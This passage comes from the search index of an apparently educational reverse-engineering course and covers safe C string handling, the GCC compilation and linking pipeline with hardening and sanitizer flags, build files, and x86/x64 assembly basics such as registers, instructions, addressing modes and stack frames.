buffer[sizeof(buffer) - 1] = '\\0';\n    printf(\"Safe string: %s\\n\", buffer);\n}\n\nvoid use_after_free_example() {\n    int *ptr = malloc(sizeof(int));\n    *ptr = 42;\n    printf(\"Value: %d\\n\", *ptr);\n\n    free(ptr);\n    // ptr = NULL;  // Good practice to avoid use-after-free\n\n    // Dangerous! Using freed memory\n    // printf(\"Value after free: %d\\n\", *ptr);\n}\n\nvoid memory_leak_example() {\n    for (int i = 0; i &lt; 1000; i++) {\n        int *leak = malloc(1024 * sizeof(int));\n        // Forgot to free(leak)! Memory leak!\n        if (i == 999) free(leak); // Only free the last one\n    }\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#string-handling-and-vulnerabilities","title":"String Handling and Vulnerabilities","text":""},{"location":"foundations/01-c-essentials-ii/#safe-string-operations","title":"Safe String Operations","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid safe_string_copy() {\n    char dest[20];\n    const char *src = \"Hello, World!\";\n\n    // Unsafe: strcpy(dest, src);\n\n    // Safe alternatives:\n    strncpy(dest, src, sizeof(dest) - 1);\n    dest[sizeof(dest) - 1] = '\\0';\n\n    printf(\"Copied: %s\\n\", dest);\n}\n\nvoid safe_string_concat() {\n    char buffer[50] = \"Hello, \";\n    const char *name = \"Alice\";\n\n    // Unsafe: strcat(buffer, name);\n\n    // Safe alternative:\n    strncat(buffer, name, sizeof(buffer) - strlen(buffer) - 1);\n\n    printf(\"Concatenated: %s\\n\", buffer);\n}\n\nchar* safe_string_input() {\n    char buffer[256];\n    printf(\"Enter a string: \");\n\n    if (fgets(buffer, sizeof(buffer), stdin)) {\n        // Remove newline if present\n        size_t len = strlen(buffer);\n        if (len &gt; 0 &amp;&amp; buffer[len-1] == '\\n') {\n            buffer[len-1] = '\\0';\n        }\n\n        // Return a copy\n        return strdup(buffer);\n    }\n\n    return NULL;\n}\n</code></pre>"},{"location":"foundations/01-c-essentials-ii/#key-takeaways","title":"Key Takeaways","text":"<p>Essential Concepts</p> <ul> <li>Pointers are addresses: Understanding memory addresses is crucial</li> <li>Memory management: Always pair malloc with free</li> <li>Buffer bounds: Always check array/buffer boundaries</li> <li>String safety: Use safe string functions (strncpy, strncat, etc.)</li> <li>Structure alignment: Be aware of padding and alignment</li> <li>Initialization: Always initialize variables before use</li> </ul> <p>Common Pitfalls</p> <ul> <li>Buffer overflows from unchecked input</li> <li>Use-after-free vulnerabilities</li> <li>Memory leaks from forgotten free() calls</li> <li>Null pointer dereferences</li> <li>Off-by-one errors in loops and arrays</li> </ul> <p>Next: Compilation Process</p>"},{"location":"foundations/02-compilation/","title":"Compilation Process","text":""},{"location":"foundations/02-compilation/#overview-of-compilation-pipeline","title":"Overview of Compilation Pipeline","text":"<pre><code>graph TD\n    A[Source Code .c] --&gt; B[Preprocessor cpp]\n    B --&gt; C[Preprocessed .i]\n    C --&gt; D[Compiler cc1]\n    D --&gt; E[Assembly .s]\n    E --&gt; F[Assembler as]\n    F --&gt; G[Object File .o]\n    G --&gt; H[Linker ld]\n    H --&gt; I[Executable]</code></pre>"},{"location":"foundations/02-compilation/#preprocessing-stage","title":"Preprocessing Stage","text":"<p>The preprocessor handles directives that start with <code>#</code>.</p>"},{"location":"foundations/02-compilation/#example-program","title":"Example Program","text":"<pre><code>// main.c\n#include &lt;stdio.h&gt;\n\n#define MAX_SIZE 100\n#define SQUARE(x) ((x) * (x))\n\n#ifdef DEBUG\n    #define DBG_PRINT(x) printf(\"Debug: %s\\n\", x)\n#else\n    #define DBG_PRINT(x)\n#endif\n\nint main() {\n    int size = MAX_SIZE;\n    int area = SQUARE(10);\n\n    DBG_PRINT(\"Starting program\");\n    printf(\"Size: %d, Area: %d\\n\", size, area);\n\n    return 0;\n}\n</code></pre>"},{"location":"foundations/02-compilation/#preprocessing-commands","title":"Preprocessing Commands","text":"<pre><code># View preprocessed output\ngcc -E main.c -o main.i\n\n# Or directly to stdout\ngcc -E main.c\n\n# With debug symbols\ngcc -E -DDEBUG main.c\n</code></pre>"},{"location":"foundations/02-compilation/#what-the-preprocessor-does","title":"What the Preprocessor Does","text":"<ol> <li>File Inclusion: Replaces <code>#include</code> with file contents</li> <li>Macro Expansion: Substitutes <code>#define</code> macros</li> <li>Conditional Compilation: Processes <code>#ifdef</code>, <code>#ifndef</code>, <code>#if</code></li> <li>Comment Removal: Strips out comments</li> <li>Line Numbering: Adds line directives for debugging</li> </ol>"},{"location":"foundations/02-compilation/#compilation-to-assembly","title":"Compilation to Assembly","text":"<p>The compiler translates preprocessed C into assembly language.</p>"},{"location":"foundations/02-compilation/#compilation-commands","title":"Compilation Commands","text":"<pre><code># Compile to assembly\ngcc -S main.c -o main.s\n$ ls -l\n\n# View with different optimization levels\ngcc -S -O0 main.c -o main_O0.s    # No optimization\ngcc -S -O1 main.c -o main_O1.s    # Basic optimization\ngcc -S -O2 main.c -o main_O2.s    # More optimization\ngcc -S -O3 main.c -o main_O3.s    # Aggressive optimization\n\n# Generate assembly with debugging info\ngcc -S -g main.c -o main_debug.s\n</code></pre>"},{"location":"foundations/02-compilation/#example-assembly-output","title":"Example Assembly Output","text":"<pre><code># main.s (simplified x86_64)\n.file   \"main.c\"\n.text\n.globl  main\n.type   main, @function\n\nmain:\n.LFB0:\n    pushq   %rbp\n    movq    %rsp, %rbp\n    subq    $16, %rsp\n\n    movl    $100, -4(%rbp)      # size = MAX_SIZE (100)\n    movl    $100, -8(%rbp)      # area = SQUARE(10) = 100\n\n    movl    -8(%rbp), %edx      # Load area\n    movl    -4(%rbp), %esi      # Load size\n    leaq    .LC0(%rip), %rdi    # Load format string\n    movl    $0, %eax\n    call    printf@PLT\n\n    movl    $0, %eax            # return 0\n    leave\n    ret\n\n.section .rodata\n.LC0:\n    .string \"Size: %d, Area: %d\\n\"\n</code></pre>"},{"location":"foundations/02-compilation/#compiler-optimizations","title":"Compiler Optimizations","text":"<p>Different optimization levels produce vastly different assembly:</p> <pre><code>// test.c\nint add_numbers(int a, int b) {\n    int temp = a + b;\n    return temp;\n}\n\nint main() {\n    int result = add_numbers(5, 3);\n    return result;\n}\n</code></pre> <p>-O0 (No optimization): <pre><code>add_numbers:\n    pushq   %rbp\n    movq    %rsp, %rbp\n    movl    %edi, -20(%rbp)\n    movl    %esi, -16(%rbp)\n    movl    -20(%rbp), %edx\n    movl    -16(%rbp), %eax\n    addl    %edx, %eax\n    movl    %eax, -4(%rbp)\n    movl    -4(%rbp), %eax\n    popq    %rbp\n    ret\n</code></pre></p> <p>-O2 (Optimized): <pre><code>add_numbers:\n    leal    (%rdi,%rsi), %eax    # Just lea instruction!\n    ret\n</code></pre></p>"},{"location":"foundations/02-compilation/#assembly-stage","title":"Assembly Stage","text":"<p>The assembler converts assembly language into machine code.</p>"},{"location":"foundations/02-compilation/#assembly-commands","title":"Assembly Commands","text":"<pre><code># Assemble to object file\nas main.s -o main.o\n\n# Or using gcc\ngcc -c main.s -o main.o\n\n# View object file contents\nobjdump -d main.o       # Disassemble\nobjdump -t main.o       # Symbol table\nobjdump -h main.o       # Section headers\nreadelf -a main.o       # ELF file analysis\n</code></pre>"},{"location":"foundations/02-compilation/#object-file-structure","title":"Object File Structure","text":"<pre><code># Examine sections\n$ objdump -h main.o\n\nSections:\nIdx Name          Size      VMA               LMA               File off  Algn\n  0 .text         00000035  0000000000000000  0000000000000000  00000040  2**0\n  1 .data         00000000  0000000000000000  0000000000000000  00000075  2**0\n  2 .bss          00000000  0000000000000000  0000000000000000  00000075  2**0\n  3 .rodata       00000014  0000000000000000  0000000000000000  00000075  2**0\n</code></pre>"},{"location":"foundations/02-compilation/#symbol-tables","title":"Symbol Tables","text":"<pre><code># View symbols\n$ objdump -t main.o\n\nSYMBOL TABLE:\n0000000000000000 l    df *ABS*  0000000000000000 main.c\n0000000000000000 l    d  .text  0000000000000000 .text\n0000000000000000 l    d  .rodata        0000000000000000 .rodata\n0000000000000000 g     F .text  0000000000000035 main\n0000000000000000         *UND*  0000000000000000 printf\n</code></pre>"},{"location":"foundations/02-compilation/#linking-stage","title":"Linking Stage","text":"<p>The linker combines object files and libraries into a final executable.</p>"},{"location":"foundations/02-compilation/#types-of-linking","title":"Types of Linking","text":""},{"location":"foundations/02-compilation/#static-linking","title":"Static Linking","text":"<pre><code># Static linking (includes library code in executable)\ngcc -static main.o -o main_static\n\n# Check size difference\nls -la main_static main_dynamic\n</code></pre>"},{"location":"foundations/02-compilation/#dynamic-linking","title":"Dynamic Linking","text":"<pre><code># Dynamic linking (default)\ngcc main.o -o main_dynamic\n\n# View dynamic dependencies\nldd main_dynamic\n</code></pre>"},{"location":"foundations/02-compilation/#linking-process","title":"Linking Process","text":"<ol> <li>Symbol Resolution: Match function calls to definitions</li> <li>Relocation: Adjust addresses for final memory layout</li> <li>Section Merging: Combine similar sections from different objects</li> <li>Entry Point Setting: Set program start address</li> </ol>"},{"location":"foundations/02-compilation/#example-multi-file-project","title":"Example Multi-File Project","text":"<p>math.h: <pre><code>#ifndef MATH_H\n#define MATH_H\n\nint add(int a, int b);\nint multiply(int a, int b);\n\n#endif\n</code></pre></p> <p>math.c: <pre><code>#include \"math.h\"\n\nint add(int a, int b) {\n    return a + b;\n}\n\nint multiply(int a, int b) {\n    return a * b;\n}\n</code></pre></p> <p>main.c: <pre><code>#include &lt;stdio.h&gt;\n#include \"math.h\"\n\nint main() {\n    int sum = add(5, 3);\n    int product = multiply(4, 7);\n\n    printf(\"Sum: %d, Product: %d\\n\", sum, product);\n    return 0;\n}\n</code></pre></p> <p>Compilation Process: <pre><code># Compile each source file to object file\ngcc -c math.c -o math.o\ngcc -c main.c -o main.o\n\n# Link object files\ngcc math.o main.o -o program\n\n# Or do it all in one step\ngcc math.c main.c -o program\n</code></pre></p>"},{"location":"foundations/02-compilation/#creating-and-using-libraries","title":"Creating and Using Libraries","text":""},{"location":"foundations/02-compilation/#static-libraries-a-files","title":"Static Libraries (.a files)","text":"<pre><code># Create static library\nar rcs libmath.a math.o\n\n# Link with static library\ngcc main.o -L. -lmath -o program_static\n\n# Or specify full path\ngcc main.o libmath.a -o program_static\n</code></pre>"},{"location":"foundations/02-compilation/#shared-libraries-so-files","title":"Shared Libraries (.so files)","text":"<pre><code># Create shared library\ngcc -shared -fPIC math.c -o libmath.so\n\n# Link with shared library\ngcc main.o -L. -lmath -o program_shared\n\n# Run with shared library (if not in standard path)\nLD_LIBRARY_PATH=. ./program_shared\n</code></pre>"},{"location":"foundations/02-compilation/#build-systems","title":"Build Systems","text":""},{"location":"foundations/02-compilation/#makefiles","title":"Makefiles","text":"<pre><code># Makefile\nCC = gcc\nCFLAGS = -Wall -Wextra -g\nOBJECTS = main.o math.o\nTARGET = program\n\n$(TARGET): $(OBJECTS)\n    $(CC) $(OBJECTS) -o $(TARGET)\n\nmain.o: main.c math.h\n    $(CC) $(CFLAGS) -c main.c\n\nmath.o: math.c math.h\n    $(CC) $(CFLAGS) -c math.c\n\nclean:\n    rm -f $(OBJECTS) $(TARGET)\n\n.PHONY: clean\n</code></pre>"},{"location":"foundations/02-compilation/#cmake-example","title":"CMake Example","text":"<pre><code># CMakeLists.txt\ncmake_minimum_required(VERSION 3.10)\nproject(MathProgram)\n\nset(CMAKE_C_STANDARD 99)\n\nadd_library(math math.c)\nadd_executable(program main.c)\ntarget_link_libraries(program math)\ntarget_include_directories(program PRIVATE .)\n</code></pre>"},{"location":"foundations/02-compilation/#debugging-information","title":"Debugging Information","text":""},{"location":"foundations/02-compilation/#debug-symbols","title":"Debug Symbols","text":"<pre><code># Compile with debug information\ngcc -g -O0 main.c -o main_debug\n\n# Strip debug information\nstrip main_debug -o main_stripped\n\n# Compare file sizes\nls -la main_debug main_stripped\n\n# View debug sections\nobjdump -g main_debug    # Debug sections\nreadelf -w main_debug    # DWARF debug info\n</code></pre>"},{"location":"foundations/02-compilation/#different-debug-formats","title":"Different Debug Formats","text":"<pre><code># DWARF format (default on Linux)\ngcc -g -gdwarf-4 main.c -o main_dwarf\n\n# Generate additional debug info\ngcc -g3 main.c -o main_debug3    # Include macro definitions\n\n# Split debug info\nobjcopy --only-keep-debug main_debug main.debug\nobjcopy --strip-debug main_debug\nobjcopy --add-gnu-debuglink=main.debug main_debug\n</code></pre>"},{"location":"foundations/02-compilation/#cross-compilation","title":"Cross-Compilation","text":""},{"location":"foundations/02-compilation/#targeting-different-architectures","title":"Targeting Different Architectures","text":"<pre><code># 32-bit on 64-bit system\ngcc -m32 main.c -o main_32bit\n\n# Different target architecture (requires cross-compiler)\narm-linux-gnueabihf-gcc main.c -o main_arm\n</code></pre>"},{"location":"foundations/02-compilation/#common-gcc-options","title":"Common GCC Options","text":""},{"location":"foundations/02-compilation/#output-control","title":"Output Control","text":"<pre><code># Specify output file\ngcc main.c -o program              # Custom executable name\ngcc -c main.c -o main.o           # Object file output\ngcc -S main.c -o main.s           # Assembly output\ngcc -E main.c -o main.i           # Preprocessed output\n\n# Multiple files\ngcc file1.c file2.c -o program    # Compile and link multiple files\ngcc *.c -o program                # Compile all C files in directory\n</code></pre>"},{"location":"foundations/02-compilation/#preprocessing-options","title":"Preprocessing Options","text":"<pre><code># Define macros\ngcc -DDEBUG main.c                # Define DEBUG macro\ngcc -DMAX_SIZE=200 main.c         # Define macro with value\ngcc -DDEBUG=1 -DVERSION=\\\"1.0\\\" main.c  # Multiple definitions\n\n# Include directories\ngcc -I/usr/local/include main.c   # Add include directory\ngcc -I. -I../include main.c       # Multiple include paths\n\n# Preprocessor only\ngcc -E main.c                     # Show preprocessed output\ngcc -M main.c                     # Generate dependency information\ngcc -MM main.c                    # Dependencies without system headers\n</code></pre>"},{"location":"foundations/02-compilation/#library-and-linking-options","title":"Library and Linking Options","text":"<pre><code># Link with libraries\ngcc main.c -lm                    # Link with math library\ngcc main.c -lpthread             # Link with pthread library\ngcc main.c -lssl -lcrypto         # Multiple libraries\n\n# Library search paths\ngcc main.c -L/usr/local/lib -lmylib   # Add library search directory\ngcc main.c -L. -lmath                 # Use current directory\n\n# Static vs dynamic linking\ngcc main.c -static                # Force static linking\ngcc main.c -shared                # Create shared library\ngcc -fPIC -shared lib.c -o lib.so # Position Independent Code for shared lib\n\n# Runtime library path\ngcc main.c -Wl,-rpath,/opt/lib    # Set runtime library search path\n</code></pre>"},{"location":"foundations/02-compilation/#debug-and-profiling-options","title":"Debug and Profiling Options","text":"<pre><code># Debug information\ngcc -g main.c                     # Include debug symbols\ngcc -g3 main.c                    # Maximum debug info (includes macros)\ngcc -ggdb main.c                  # GDB-specific debug format\ngcc -gdwarf-4 main.c              # Specific DWARF version\n\n# Profiling\ngcc -pg main.c                    # Enable profiling with gprof\ngcc -fprofile-arcs -ftest-coverage main.c  # Code coverage analysis\n</code></pre>"},{"location":"foundations/02-compilation/#warning-and-error-options","title":"Warning and Error Options","text":"<pre><code># Basic warnings\ngcc -Wall main.c                  # Enable common warnings\ngcc -Wextra main.c                # Extra warnings\ngcc -Werror main.c                # Treat warnings as errors\ngcc -w main.c                     # Suppress all warnings\n\n# Specific warnings\ngcc -Wunused main.c               # Warn about unused variables\ngcc -Wformat main.c               # Check printf/scanf format strings\ngcc -Wconversion main.c           # Warn about type conversions\ngcc -Wshadow main.c               # Warn about variable shadowing\ngcc -Wstrict-prototypes main.c    # Require function prototypes\n\n# Error control\ngcc -Wfatal-errors main.c         # Stop after first error\ngcc -fmax-errors=5 main.c         # Limit number of errors reported\n</code></pre>"},{"location":"foundations/02-compilation/#optimization-options","title":"Optimization Options","text":"<pre><code># Optimization levels\ngcc -O0 main.c                    # No optimization (default)\ngcc -O1 main.c                    # Basic optimization\ngcc -O2 main.c                    # Standard optimization\ngcc -O3 main.c                    # Aggressive optimization\ngcc -Os main.c                    # Optimize for size\ngcc -Ofast main.c                 # Fastest optimization (may break standards)\n\n# Specific optimizations\ngcc -O2 -funroll-loops main.c     # Unroll loops\ngcc -O2 -finline-functions main.c # Inline functions aggressively\ngcc -O2 -fomit-frame-pointer main.c # Omit frame pointer\ngcc -O2 -ffast-math main.c        # Fast floating-point math\n</code></pre>"},{"location":"foundations/02-compilation/#architecture-and-platform-options","title":"Architecture and Platform Options","text":"<pre><code># Target architecture\ngcc -m32 main.c                   # 32-bit target\ngcc -m64 main.c                   # 64-bit target\ngcc -march=native main.c          # Optimize for current CPU\ngcc -march=core2 main.c           # Target specific CPU architecture\ngcc -mtune=generic main.c         # Tune for generic CPU\n\n# Platform-specific\ngcc -msse4 main.c                 # Enable SSE4 instructions\ngcc -mavx main.c                  # Enable AVX instructions\ngcc -mfpmath=sse main.c           # Use SSE for floating-point math\n</code></pre>"},{"location":"foundations/02-compilation/#security-and-hardening-options","title":"Security and Hardening Options","text":"<pre><code># Stack protection\ngcc -fstack-protector main.c      # Basic stack protection\ngcc -fstack-protector-all main.c  # Protect all functions\ngcc -fstack-protector-strong main.c # Strong stack protection\n\n# Position independence\ngcc -fPIC main.c                  # Position Independent Code\ngcc -fPIE main.c                  # Position Independent Executable\ngcc -pie main.c                   # Create PIE executable\n\n# Buffer overflow protection\ngcc -D_FORTIFY_SOURCE=1 main.c    # Basic buffer overflow detection\ngcc -D_FORTIFY_SOURCE=2 main.c    # Enhanced buffer overflow detection\n\n# Other security features\ngcc -Wl,-z,relro main.c           # Read-only relocations\ngcc -Wl,-z,now main.c             # Immediate binding\ngcc -Wl,-z,noexecstack main.c     # Non-executable stack\n</code></pre>"},{"location":"foundations/02-compilation/#language-standard-options","title":"Language Standard Options","text":"<pre><code># C standards\ngcc -std=c89 main.c               # ANSI C (C89/C90)\ngcc -std=c99 main.c               # C99 standard\ngcc -std=c11 main.c               # C11 standard\ngcc -std=c17 main.c               # C17 standard\ngcc -std=gnu99 main.c             # GNU C99 (with extensions)\n\n# Strict compliance\ngcc -std=c99 -pedantic main.c     # Strict standard compliance\ngcc -std=c99 -pedantic-errors main.c # Pedantic warnings as errors\n</code></pre>"},{"location":"foundations/02-compilation/#debugging-and-analysis-options","title":"Debugging and Analysis Options","text":"<pre><code># Sanitizers (runtime error detection)\ngcc -fsanitize=address main.c     # Address sanitizer (memory errors)\ngcc -fsanitize=thread main.c      # Thread sanitizer (race conditions)\ngcc -fsanitize=undefined main.c   # Undefined behavior sanitizer\ngcc -fsanitize=leak main.c        # Memory leak detector\n\n# Static analysis\ngcc -fanalyzer main.c             # Enable static analyzer (GCC 10+)\n\n# Verbose output\ngcc -v main.c                     # Verbose compilation output\ngcc -Q --help=target              # Show target-specific options\ngcc -dumpspecs                    # Show built-in specs\n</code></pre>"},{"location":"foundations/02-compilation/#miscellaneous-options","title":"Miscellaneous Options","text":"<pre><code># Preprocessing control\ngcc -C main.c                     # Keep comments in preprocessed output\ngcc -P main.c                     # Don't generate line markers\ngcc -traditional main.c           # Traditional C preprocessing\n\n# Dependency generation\ngcc -MD main.c                    # Generate dependency file\ngcc -MMD main.c                   # Dependencies excluding system headers\ngcc -MF deps.d main.c             # Specify dependency output file\n\n# Temporary files\ngcc -save-temps main.c            # Keep intermediate files\ngcc -pipe main.c                  # Use pipes instead of temporary files\n\n# Multiple jobs\nmake -j4                          # Use 4 parallel jobs (for makefiles)\ngcc -j4 *.c                       # Parallel compilation (newer GCC versions)\n</code></pre>"},{"location":"foundations/02-compilation/#practical-examples","title":"Practical Examples","text":"<p>Development Build: <pre><code>gcc -g -O0 -Wall -Wextra -std=c99 -DDEBUG main.c -o main_debug\n</code></pre></p> <p>Release Build: <pre><code>gcc -O2 -DNDEBUG -s main.c -o main_release\n</code></pre></p> <p>Security-Hardened Build: <pre><code>gcc -O2 -D_FORTIFY_SOURCE=2 -fstack-protector-strong -fPIE -pie \\\n    -Wl,-z,relro,-z,now main.c -o main_secure\n</code></pre></p> <p>Analysis Build: <pre><code>gcc -g -O1 -fsanitize=address -fsanitize=undefined -fanalyzer \\\n    -Wall -Wextra main.c -o main_analysis\n</code></pre></p>"},{"location":"foundations/02-compilation/#key-takeaways","title":"Key Takeaways","text":"<p>Understanding Compilation</p> <ul> <li>Preprocessing expands macros and includes files</li> <li>Compilation translates C to assembly language</li> <li>Assembly converts assembly to machine code</li> <li>Linking combines object files and resolves symbols</li> <li>Optimization can dramatically change code structure</li> </ul> <p>Reverse Engineering Insights</p> <ul> <li>Higher optimization makes code harder to reverse</li> <li>Debug symbols provide valuable information</li> <li>Static linking includes more code in the binary</li> <li>Understanding compilation helps interpret disassembly</li> </ul> <p>Next: Assembly Basics</p>"},{"location":"foundations/03-assembly/","title":"Assembly Basics (x86 &amp; x64)","text":"<p>Assembly language is the bridge between high-level code and machine instructions. Understanding assembly is crucial for reverse engineering and binary exploitation.</p>"},{"location":"foundations/03-assembly/#architecture-overview","title":"Architecture Overview","text":""},{"location":"foundations/03-assembly/#x86-vs-x64-differences","title":"x86 vs x64 Differences","text":"Feature x86 (32-bit) x64 (64-bit) Address Width 32 bits (4 GB) 64 bits (16 EB) General Registers 8 (EAX-EDI) 16 (RAX-R15) Calling Convention cdecl, stdcall System V ABI, Microsoft x64 Pointer Size 4 bytes 8 bytes Default Operation Size 32 bits 64 bits"},{"location":"foundations/03-assembly/#register-architecture","title":"Register Architecture","text":""},{"location":"foundations/03-assembly/#x86-registers-32-bit","title":"x86 Registers (32-bit)","text":"<pre><code>General Purpose Registers:\nEAX (Accumulator)    - Return values, arithmetic\nEBX (Base)           - Base pointer for memory\nECX (Counter)        - Loop counter, string operations\nEDX (Data)           - I/O operations, arithmetic\nESI (Source Index)   - String source pointer\nEDI (Dest Index)     - String destination pointer\nEBP (Base Pointer)   - Stack frame base\nESP (Stack Pointer)  - Stack top\n\nSegment Registers:\nCS (Code Segment)\nDS (Data Segment)\nES (Extra Segment)\nFS, GS (Additional segments)\nSS (Stack Segment)\n\nStatus/Control:\nEFLAGS - Processor status and control flags\nEIP    - Instruction Pointer\n</code></pre>"},{"location":"foundations/03-assembly/#x64-registers-64-bit","title":"x64 Registers (64-bit)","text":"<pre><code>64-bit Extensions of x86 registers:\nRAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP\n\nAdditional 64-bit registers:\nR8, R9, R10, R11, R12, R13, R14, R15\n\nRegister Naming Convention:\n64-bit: RAX (full register)\n32-bit: EAX (lower 32 bits)\n16-bit: AX  (lower 16 bits)\n8-bit:  AL  (lower 8 bits), AH (higher 8 bits of lower 16)\n\nNew 64-bit registers (R8-R15):\n64-bit: R8\n32-bit: R8D\n16-bit: R8W\n8-bit:  R8B\n</code></pre>"},{"location":"foundations/03-assembly/#register-usage-examples","title":"Register Usage Examples","text":"<pre><code>; x86 Register Manipulation\nmov eax, 0x12345678    ; EAX = 0x12345678\nmov ax, 0x9ABC         ; EAX = 0x12349ABC (only lower 16 bits changed)\nmov al, 0xEF           ; EAX = 0x12349AEF (only lower 8 bits changed)\nmov ah, 0xCD           ; EAX = 0x12349CEF (bits 8-15 changed)\n\n; x64 Register Manipulation\nmov rax, 0x123456789ABCDEF0  ; RAX = 0x123456789ABCDEF0\nmov eax, 0x11111111          ; RAX = 0x0000000011111111 (upper 32 bits zeroed!)\nmov ax, 0x2222               ; RAX = 0x0000000011112222\nmov al, 0x33                 ; RAX = 0x0000000011112233\n</code></pre>"},{"location":"foundations/03-assembly/#instruction-set-overview","title":"Instruction Set Overview","text":""},{"location":"foundations/03-assembly/#data-movement-instructions","title":"Data Movement Instructions","text":"<pre><code>; MOV - Move data\nmov eax, 42              ; eax = 42 (immediate)\nmov eax, ebx             ; eax = ebx (register to register)\nmov eax, [ebx]           ; eax = value at address ebx (memory to register)\nmov [eax], ebx           ; store ebx at address eax (register to memory)\n\n; LEA - Load Effective Address (calculate address)\nlea eax, [ebx + ecx*2 + 4]  ; eax = ebx + ecx*2 + 4 (address calculation)\n\n; XCHG - Exchange values\nxchg eax, ebx            ; swap eax and ebx\n\n; x64 examples\nmov rax, 0x123456789ABCDEF0  ; 64-bit immediate\nmov rax, [rbx]               ; load 64-bit value from memory\nmov qword ptr [rax], rbx     ; store 64-bit value to memory\n</code></pre>"},{"location":"foundations/03-assembly/#arithmetic-instructions","title":"Arithmetic Instructions","text":"<pre><code>; Addition and Subtraction\nadd eax, ebx             ; eax = eax + ebx\nadd eax, 10              ; eax = eax + 10\nsub eax, ebx             ; eax = eax - ebx\ninc eax                  ; eax = eax + 1\ndec eax                  ; eax = eax - 1\n\n; Multiplication\nmul ebx                  ; edx:eax = eax * ebx (unsigned)\nimul ebx                 ; edx:eax = eax * ebx (signed)\nimul eax, ebx            ; eax = eax * ebx (32-bit result)\nimul eax, ebx, 5         ; eax = ebx * 5\n\n; Division\ndiv ebx                  ; eax = edx:eax / ebx, edx = remainder (unsigned)\nidiv ebx                 ; eax = edx:eax / ebx, edx = remainder (signed)\n\n; Bitwise Operations\nand eax, 0xFF            ; eax = eax &amp; 0xFF\nor eax, 0x100            ; eax = eax | 0x100\nxor eax, eax             ; eax = 0 (common way to zero register)\nnot eax                  ; eax = ~eax (bitwise NOT)\nshl eax, 2               ; eax = eax &lt;&lt; 2 (shift left)\nshr eax, 2               ; eax = eax &gt;&gt; 2 (shift right, unsigned)\nsar eax, 2               ; eax = eax &gt;&gt; 2 (shift right, signed)\n</code></pre>"},{"location":"foundations/03-assembly/#control-flow-instructions","title":"Control Flow Instructions","text":"<pre><code>; Unconditional Jump\njmp label                ; Jump to label\njmp eax                  ; Jump to address in eax\njmp [eax]                ; Jump to address stored at eax\n\n; Conditional Jumps (after CMP or TEST)\ncmp eax, ebx             ; Compare eax and ebx (sets flags)\nje label                 ; Jump if equal (ZF=1)\njne label                ; Jump if not equal (ZF=0)\njl label                 ; Jump if less (SF\u2260OF)\njle label                ; Jump if less or equal\njg label                 ; Jump if greater\njge label                ; Jump if greater or equal\nja label                 ; Jump if above (unsigned &gt;)\njb label                 ; Jump if below (unsigned &lt;)\n\n; Test instruction\ntest eax, eax            ; Test if eax is zero (sets flags)\njz label                 ; Jump if zero\njnz label                ; Jump if not zero\n\n; Loop instructions\nloop label               ; Decrement ECX, jump if ECX != 0\n</code></pre>"},{"location":"foundations/03-assembly/#function-calls-and-stack-operations","title":"Function Calls and Stack Operations","text":"<pre><code>; Function calls\ncall function_name       ; Push return address, jump to function\nret                      ; Pop return address, jump back\nret 8                    ; Return and clean up 8 bytes from stack\n\n; Stack operations\npush eax                 ; Decrease ESP by 4, store EAX at [ESP]\npop eax                  ; Load [ESP] into EAX, increase ESP by 4\npushad                   ; Push all general registers\npopad                    ; Pop all general registers\n\n; x64 stack operations\npush rax                 ; Decrease RSP by 8, store RAX at [RSP]\npop rax                  ; Load [RSP] into RAX, increase RSP by 8\n</code></pre>"},{"location":"foundations/03-assembly/#addressing-modes","title":"Addressing Modes","text":""},{"location":"foundations/03-assembly/#x86-addressing-modes","title":"x86 Addressing Modes","text":"<pre><code>; Direct addressing\nmov eax, 12345           ; Immediate value\n\n; Register direct\nmov eax, ebx             ; Register to register\n\n; Memory addressing modes\nmov eax, [1234]          ; Direct memory (absolute address)\nmov eax, [ebx]           ; Register indirect\nmov eax, [ebx + 4]       ; Register + displacement\nmov eax, [ebx + esi]     ; Register + register\nmov eax, [ebx + esi + 8] ; Register + register + displacement\nmov eax, [ebx + esi*2]   ; Register + scaled register\nmov eax, [ebx + esi*4 + 8] ; Full addressing: base + index*scale + displacement\n\n; Scale factors: 1, 2, 4, 8 (for byte, word, dword, qword indexing)\n</code></pre>"},{"location":"foundations/03-assembly/#x64-addressing-enhancements","title":"x64 Addressing Enhancements","text":"<pre><code>; RIP-relative addressing (position independent)\nmov eax, [rip + offset]   ; Relative to instruction pointer\n\n; Extended addressing with R8-R15\nmov rax, [r8 + r9*2 + 16] ; Using new registers\n\n; 64-bit displacement\nmov rax, [rbx + 0x123456789] ; Large displacement\n</code></pre>"},{"location":"foundations/03-assembly/#assembly-syntax-intel-vs-att","title":"Assembly Syntax: Intel vs AT&amp;T","text":""},{"location":"foundations/03-assembly/#intel-syntax-windows-common-in-disassemblers","title":"Intel Syntax (Windows, common in disassemblers)","text":"<pre><code>mov eax, ebx             ; destination, source\nadd eax, [ebx + 4]       ; brackets for memory\ncall function\n</code></pre>"},{"location":"foundations/03-assembly/#att-syntax-linux-gcc-default","title":"AT&amp;T Syntax (Linux, GCC default)","text":"<pre><code>movl %ebx, %eax          ; source, destination (% prefix)\naddl 4(%ebx), %eax       ; parentheses for memory\ncall function\n</code></pre>"},{"location":"foundations/03-assembly/#stack-frame-structure","title":"Stack Frame Structure","text":""},{"location":"foundations/03-assembly/#function-prologue-and-epilogue","title":"Function Prologue and Epilogue","text":"<pre><code>; Function prologue (x86)\npush ebp                 ; Save old base pointer\nmov ebp, esp             ; Set up new base pointer\nsub esp, 16              ; Allocate 16 bytes for local variables\n\n; Function body\nmov [ebp-4], eax         ; Store local variable\nmov eax, [ebp+8]         ; Access first parameter\n\n; Function epilogue\nmov esp, ebp             ; Restore stack pointer\npop ebp                  ; Restore old base pointer\nret                      ; Return\n\n; Simplified epilogue\nleave                    ; Equivalent to: mov esp, ebp; pop ebp\nret\n</code></pre>"},{"location":"foundations/03-assembly/#x64-function-structure","title":"x64 Function Structure","text":"<pre><code>; x64 function prologue\npush rbp\nmov rbp, rsp\nsub rsp, 32              ; Allocate space (aligned to 16 bytes)\n\n; Shadow space in Windows x64 (32 bytes for register parameters)\n; Function body can use [rbp-8], [rbp-16], etc. for locals\n\n; x64 epilogue\nadd rsp, 32              ; Deallocate space\npop rbp\nret\n</code></pre>"},{"location":"foundations/03-assembly/#calling-conventions","title":"Calling Conventions","text":""},{"location":"foundations/03-assembly/#x86-calling-conventions","title":"x86 Calling Conventions","text":""},{"location":"foundations/03-assembly/#cdecl-c-calling-convention","title":"cdecl (C calling 